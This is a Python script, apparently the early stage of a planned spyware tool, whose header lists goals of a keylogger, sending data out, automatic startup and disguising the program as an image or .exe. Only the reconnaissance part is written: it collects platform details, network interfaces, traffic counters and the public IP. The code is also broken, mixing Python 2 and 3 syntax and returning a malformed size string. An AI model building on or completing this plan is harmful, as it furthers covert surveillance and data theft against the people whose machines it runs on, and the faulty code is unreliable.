#1. System Information [Done]
#2. Keylogger
#3. Data Sending
#4. Automatic execution on system startup
#5. Convert code to an image/.exe application

#requirements (windows)
# execute the respective commands in a windows cmd.
# -> python -m pip install psutil
# -> python -m pip install requests

import platform
import psutil
from datetime import datetime
from requests import get

def GetExternalIP():
    ip = get('https://api.ipify.org').text
    print 'My public IP address is:', ip


def get_size(bytes, suffix="B"):
    """
    Scale bytes to its proper format
    e.g:
        1253656 => '1.20MB'
        1253656678 => '1.17GB'
    """
    factor = 1024
    for unit in ["", "K", "M", "G", "T", "P"]:
        if bytes < factor:
            return"bytes: " + unit + suffix;
        #{bytes:.2f}{unit}{suffix}"
        bytes /= factor

def GetSystemInformation():
    print("="*40, "System Information", "="*40)
    uname = platform.uname()
    print uname;

def NetworkInformation():
    print("="*40, "Network Information", "="*40)
    # get all network interfaces (virtual and physical)
    if_addrs = psutil.net_if_addrs()
    for interface_name, interface_addresses in if_addrs.items():
        for address in interface_addresses:
            print("=== Interface: "+interface_name+" ===")
            
            if str(address.family) == '2':
                if(address.address):
                    print("  IP Address: " + address.address)
                if(address.netmask):
                    print("  Netmask: "+ address.netmask)
                if(address.broadcast):
                    print("  Broadcast IP: " + address.broadcast)
            elif str(address.family) == '-1':
                if(address.address):
                    print("  MAC Address: " + address.address)
                if(address.netmask):
                    print("  Netmask: " + address.netmask)
                if(address.broadcast):
                    print("  Broadcast MAC: " + address.broadcast)
            else: # family 23 == ipv6?
                print(address)
    # get IO statistics since boot
    net_io = psutil.net_io_counters()
    print("Total Bytes Sent: " + get_size(net_io.bytes_sent))
    print("Total Bytes Received: " + get_size(net_io.bytes_recv))
         
GetSystemInformation()
NetworkInformation()
GetExternalIP()
